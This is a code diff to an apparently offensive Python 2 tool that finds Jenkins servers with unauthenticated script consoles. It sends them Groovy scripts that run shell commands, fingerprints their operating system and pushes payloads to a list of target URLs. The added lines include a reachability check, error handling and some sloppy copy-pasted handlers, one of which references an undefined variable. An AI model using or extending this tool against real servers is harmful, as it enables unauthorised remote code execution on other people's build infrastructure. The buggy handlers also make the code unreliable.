@@ -10,6 +10,33 @@ from colorama import init
 from colorama import Fore, Back, Style
 from bs4 import BeautifulSoup
 
+def PreCheck(url):
+    "Quick Check if Jenkins Host is Resping to our Requests and is the Script Console availible to us"
+    
+    result=False
+
+    try:
+
+        url=url.replace("/script","")
+        req = urllib2.Request(url+'/api')
+        response = urllib2.urlopen(req, timeout=10)
+        the_page = response.read()
+
+        result=True
+
+    except urllib2.HTTPError as err:
+        if args.verbose:
+            print (Fore.RED+"Jenkins Host is not Up or Jenkins requires an auth (secured)")
+            print(err.reason)
+            print(Style.RESET_ALL)
+
+    except Exception:
+       if args.verbose:
+            print "Jenkins Host is not Up or Jenkins requires an auth (secured)"
+            print(Style.RESET_ALL)
+
+    return result
+
 def SendGroovyScriptScript(url,crumb,groovyscript):
     "Sends any Groovy Script to the given Jenskins Host via ScripConsole"
 
@@ -101,9 +128,18 @@ def GetJenkinsCrumb(url):
         response = urllib2.urlopen(req, timeout=10)
         the_page = response.read()
         crumb = the_page.strip()
-    except:
+
+    except urllib2.HTTPError as err:
         if args.verbose:
-            print "Failed to get Jenkins Crumb"
+            print(Fore.RED+"Failed to get Jenkins Crumb")
+            print(err.reason)
+            print(Style.RESET_ALL)
+
+    except Exception:
+       if args.verbose:
+            print (Fore.RED+"Failed to get Jenkins Crumb")
+            print(Style.RESET_ALL)
+
 
     return crumb
 
@@ -122,15 +158,27 @@ def GenerateGroovyLinuxPayload(payload):
 
     return payload_script
 
-
 def GetJenkinsSystemType(url,crumb):
+
+    try:
 
       result=SendGroovyScriptScript(url,crumb,ConvertShell2GroovyScript('wmic os get Caption /value'))
 
-      if not result.find('Windows')==-1:
-          return "windows"
+      if not result==None:
+          
+          if not result.find('Windows')==-1:
+            return "windows"
+          else:
+            return "linux"
       else:
-          return "linux"
+          print(Fore.YELLOW+"Failed to identify SystemType")
+          print(Style.RESET_ALL)
+          return "unknown"
+
+    except Exception:
+        if args.verbose:
+            print "Failed to get Jenkins Crumb"
+            print(err.reason)
 
 def WriteJenkinsInfo(url,text,file):
 
@@ -263,10 +311,15 @@ print "Done - Scripts Imported"
 print
 
 for jenkinsurl in url_list:
+   
+  try:
 
     print "Analyzing {0} ".format(jenkinsurl)
     print
-    
+
+    if PreCheck(jenkinsurl)==False:
+        raise ValueError("Jenkins Host is not Up or Jenkins requires an auth (secured)")
+
     if args.verbose:
         print "Trying to getting Jenkins Crumb..."
    
@@ -284,6 +337,9 @@ for jenkinsurl in url_list:
          print "Getting System Type of Host {0}".format(jenkinsurl)
 
     system_type=GetJenkinsSystemType(jenkinsurl,crumb)
+
+    if system_type=="unknown":
+        raise ValueError("Failed to indentify SystemType!")
 
     if args.verbose:
         print "Detected System Type:{0}".format(system_type)
@@ -335,3 +391,6 @@ for jenkinsurl in url_list:
                 print(Fore.RED + "Failed to send Payload to {0}".format(jenkinsurl))
                 print(Style.RESET_ALL)
 
+  except ValueError as err:
+        print (Fore.RED+err.message)
+        print(Style.RESET_ALL)
